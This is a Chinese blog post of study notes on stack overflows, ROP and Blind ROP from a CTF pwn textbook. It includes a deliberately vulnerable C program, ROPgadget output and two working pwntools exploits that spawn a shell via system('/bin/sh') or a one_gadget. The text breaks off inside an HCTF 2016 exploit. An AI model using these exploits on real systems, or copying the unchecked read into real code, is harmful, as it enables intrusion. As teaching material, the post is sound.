<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>第10章_栈溢出与ROP | zsky's Blog</title><meta name="keywords" content="pwn,读书笔记,《CTF竞赛权威指南-pwn篇》"><meta name="author" content="zsky"><meta name="copyright" content="zsky"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="栈溢出原理由于C语言对数组引用不做任何边界检查，从而导致缓冲区溢出成为一种很常见的漏洞。由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦发生严重的溢出，攻击者可以通过覆盖返回地址来执行任意代码，利用方法包括shellcode注入、retlibc，rop等 危险函数大多数缓冲区溢出问题都是错误地使用了一些危险函数所导致的。  scanf, gets这类 strcpy, strcat">
<meta property="og:type" content="article">
<meta property="og:title" content="第10章_栈溢出与ROP">
<meta property="og:url" content="https://zzzzsky.github.io/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/index.html">
<meta property="og:site_name" content="zsky&#39;s Blog">
<meta property="og:description" content="栈溢出原理由于C语言对数组引用不做任何边界检查，从而导致缓冲区溢出成为一种很常见的漏洞。由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦发生严重的溢出，攻击者可以通过覆盖返回地址来执行任意代码，利用方法包括shellcode注入、retlibc，rop等 危险函数大多数缓冲区溢出问题都是错误地使用了一些危险函数所导致的。  scanf, gets这类 strcpy, strcat">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dmoe.cc/random.php?zhanyichuyurop">
<meta property="article:published_time" content="2022-04-11T03:12:00.000Z">
<meta property="article:modified_time" content="2023-04-14T09:16:32.665Z">
<meta property="article:author" content="zsky">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="读书笔记">
<meta property="article:tag" content="《CTF竞赛权威指南-pwn篇》">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.dmoe.cc/random.php?zhanyichuyurop"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://zzzzsky.github.io/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '第10章_栈溢出与ROP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-14 17:16:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/background.css"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友联</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?zhanyichuyurop')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zsky's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友联</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第10章_栈溢出与ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-11T03:12:00.000Z" title="发表于 2022-04-11 11:12:00">2022-04-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-14T09:16:32.665Z" title="更新于 2023-04-14 17:16:32">2023-04-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn%E5%AD%A6%E4%B9%A0/">pwn学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="第10章_栈溢出与ROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>由于C语言对数组引用不做任何边界检查，从而导致缓冲区溢出成为一种很常见的漏洞。由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦发生严重的溢出，攻击者可以通过覆盖返回地址来执行任意代码，利用方法包括shellcode注入、retlibc，rop等</p>
<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><p>大多数缓冲区溢出问题都是错误地使用了一些危险函数所导致的。</p>
<ol>
<li>scanf, gets这类</li>
<li>strcpy, strcat, sprintf这一类</li>
</ol>
<h2 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h2><p>ROP是Return-Oriented Programming 的缩写，因为引入了NX机制，数据所在的内存页被标记为不可执行，此时在执行shellcode就会抛出异常，因为注入新代码不可行，所以就利用程序中已有的代码。</p>
<p>使用ROP攻击，首先需要扫描文件，提取出可用的gadget片段（通常以ret指令结尾），然后将这些gadget进行组合，来达到攻击者的目的。举个例子，exit(0)的shellcode由下面4条连续的指令组成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; exit(0) shellcode</span><br><span class="line">xor eax, eax</span><br><span class="line">xor ebx, ebx</span><br><span class="line">inc eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>ROP链为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; exit(0) ROP chain</span><br><span class="line">xor eax, eax	;gadget 1		地址A</span><br><span class="line">ret</span><br><span class="line">xor ebx, ebx	;gadget 2		地址B</span><br><span class="line">ret</span><br><span class="line">inc eax		    ;gadget 3		地址C</span><br><span class="line">ret</span><br><span class="line">int 0x80	    ;gadget 4		地址D</span><br></pre></td></tr></table></figure>

<p>栈为（上面为低，下面为高）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">地址A		;原来的EIP的位置  低地址</span><br><span class="line">地址B</span><br><span class="line">地址C</span><br><span class="line">地址D		;			高地址</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>程序源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, dlsym(handle, <span class="string">&quot;system&quot;</span>));</span><br><span class="line">    vuln_func();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -pie -fpie main.c -ldl -o rop64</span><br></pre></td></tr></table></figure>

<p>为了方便测试，这个地方直接打印出了system的地址，来模拟信息泄露。思路就是根据system的地址找到Libc的基地址，然后找到/bin/sh的地址 + gadget（pop rdi; ret） ，将rdi传入/bin/sh的地址，然后去调用system来获取shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╭─ ~/Desktop/testC/stack_test  </span><br><span class="line">╰─ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only <span class="string">&quot;pop|ret&quot;</span> | grep rdi</span><br><span class="line">0x0000000000022394 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x000000000002164f : pop rdi ; ret</span><br><span class="line"></span><br><span class="line">╭─ ~/Desktop/testC/stack_test                                                                                                            </span><br><span class="line">╰─ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string <span class="string">&quot;/bin/sh&quot;</span>         </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000001b3d88 : /bin/sh</span><br></pre></td></tr></table></figure>

<p>exp1: ROP攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;rop64&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;system_addr: %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: %s&quot;</span> % <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x2164f</span></span><br><span class="line">ret_addr = libc_base + <span class="number">0x08aa</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的payload要在中间+ p64(ret_addr)， 这是为了<strong>对齐</strong>，具体看下面的参考文章</p>
<p>EXP2: 利用one_gadget，execve 函数  其实就是retlibc的感觉</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;rop64&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;system_addr: %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">250</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>




<blockquote>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="http://picpo.top/2021/07/19/ubuntu18%E4%BB%A5%E4%B8%8A%E7%B3%BB%E7%BB%9F64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%8C%E6%89%80%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E5%A0%86/">http://picpo.top/2021/07/19/ubuntu18%E4%BB%A5%E4%B8%8A%E7%B3%BB%E7%BB%9F64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E6%97%B6%EF%BC%8C%E6%89%80%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E5%A0%86/</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html">http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tcctw/p/11333743.html">https://www.cnblogs.com/tcctw/p/11333743.html</a></p>
</blockquote>
<h2 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h2><p>BROP，即Blind Return Oriented Programming, BROP能够在无法获得二进制程序的情况下，基于远程服务崩溃与否（连接是否中断），进行ROP攻击获得shell，可用于开启了ASLR、NX和canaries的64位Linux</p>
<h3 id="BROP原理"><a href="#BROP原理" class="headerlink" title="BROP原理"></a>BROP原理</h3><p>传统的ROP攻击需要攻击者通过逆向等手段、从二进制文件中提取可用的gadgets，而BROP在符合一定的前提条件下，无需获得二进制文件。其中两个必要的条件是↓</p>
<ol>
<li>目标程序存在栈溢出漏洞，并且可以稳定触发</li>
<li>目标进程在崩溃后回立即重启，并且重启后的进程内存不会重新随机化，这样即使目标机器开启了ASLR也没有影响</li>
</ol>
<p>BROP攻击的主要阶段如下</p>
<ol>
<li><p><strong>Stack reading</strong> ，泄露canaries和返回地址，然后从返回地址可以推算出程序的加载地址，用于后续gadgets的扫描。泄露方法是每次溢出一个字节，看程序是否崩溃。</p>
</li>
<li><p><strong>Blind ROP</strong>, 这一阶段用于远程搜索gadgets，搜索gadgets的思路也是基于溢出返回地址后判断程序是否崩溃。要搜到stop gadgets，即让程序挂起的一些指令，例如进入无限循环，sleep或read啥的，因为要利用这个stop gadgets来搜索对我们有用的gadgets，即下面这样↓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(gadgets) + ... +p64(stop gadgets)	<span class="comment"># 不会崩溃</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(gadgets)							  <span class="comment"># 会崩溃</span></span><br></pre></td></tr></table></figure>

<p>一般可以搜通用的gadgets,像下面这种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040078A 5B                                            pop     rbx</span><br><span class="line">.text:000000000040078B 5D                                            pop     rbp</span><br><span class="line">.text:000000000040078C 41 5C                                         pop     r12</span><br><span class="line">.text:000000000040078E 41 5D                                         pop     r13</span><br><span class="line">.text:0000000000400790 41 5E                                         pop     r14</span><br><span class="line">.text:0000000000400792 41 5F                                         pop     r15</span><br><span class="line">.text:0000000000400794 C3                                            retn</span><br></pre></td></tr></table></figure></li>
<li><p><strong>Build the exploit</strong>, 利用得到的gadgets构造ROP，将程序从远程服务器的内存里传回来，BROP就转换成了普通的ROP攻击</p>
</li>
</ol>
<h3 id="HCTF-2016-brop"><a href="#HCTF-2016-brop" class="headerlink" title="HCTF 2016: brop"></a>HCTF 2016: brop</h3><p>exp为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span 